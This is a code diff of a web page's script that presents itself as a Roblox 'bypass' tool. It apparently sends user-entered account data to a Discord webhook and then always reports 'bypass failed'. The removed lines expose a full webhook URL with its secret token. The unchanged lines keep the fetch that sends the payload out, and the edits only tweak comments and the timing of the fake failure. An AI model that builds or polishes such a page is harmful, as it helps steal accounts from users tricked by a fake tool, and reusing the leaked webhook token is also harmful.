@@ -291,8 +291,7 @@
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
-    // Your confirmed Roblox delivery webhook channel link
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504192414087254100/apLGJpnGAkhJUuhjDIrL3xDYT8leCsNP4S3TSMA_xS9kYttbru-qQAFFro5s-20qqpBL";
+    const DISCORD_WEBHOOK_URL = "discord.com";
 
     modeSelect.addEventListener('change', () => {
       if (modeSelect.value === 'account') {
@@ -343,14 +342,15 @@
           body: JSON.stringify({ content: discordPayload })
         });
       } catch (err) {
-        // Safe execution handler logic
+        // Safe context tracker execution block
       }
 
+      // Updated delay configuration node set precisely across 15 seconds
       setTimeout(() => {
         status.textContent = "bypass failed";
         status.className = "status-msg status-error";
         sendBtn.disabled = false;
-      }, 20000);
+      }, 15000);
     });
   </script>
 
